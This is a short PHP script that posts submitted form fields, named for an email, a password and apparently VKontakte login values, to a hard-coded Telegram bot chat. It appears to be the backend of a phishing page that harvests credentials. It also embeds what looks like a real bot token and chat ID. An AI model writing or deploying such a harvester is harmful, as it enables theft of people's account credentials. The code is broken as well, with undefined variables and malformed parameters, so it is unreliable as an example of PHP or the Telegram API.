<?php
// Replace YOUR_BOT_TOKEN and YOUR_CHAT_ID with your actual bot token and chat ID.
$bot_token = '6129641454:AAFDsfpAJAJ8B1lkc4ph2xe-MbNJyXwxUyQ';
$chat_id = '1381363954';

// Get the data from the HTML form.
$data = $_POST['data'];

// Send the data to the Telegram user.
$url = 'https://api.telegram.org/bot' . $bot_token . '/sendMessage';
$params = array(
  'chat_id' => $chat_id,
  'text' => $email1, $pass1, $vk, $vk2
);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Display a message indicating that the data has been sent.
echo 'Data has been sent to Telegram.';
?>
